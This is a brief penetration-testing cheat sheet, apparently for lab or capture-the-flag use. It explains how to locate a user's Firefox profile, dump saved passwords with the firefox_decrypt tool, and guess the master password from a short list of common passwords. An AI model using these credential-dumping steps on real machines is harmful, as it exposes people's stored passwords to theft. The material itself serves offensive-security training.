## Investigation

If there is a `.mozilla/firefox` directory in some user's home directory, we can dump credentials. So check this directory:

```sh
ls -al /home/<user>/.mozilla/
```

<br />

## Dump Passwords from Firefox Profile

To crack it, use [firefox_decrypt](https://github.com/unode/firefox_decrypt):

```sh
python3 firefox_decrypt.py .mozilla/firefox/<id>
```

If we’ll be asked the master password and we don’t know it, try common passwords.

```txt
admin
password
password1
password123
root
```
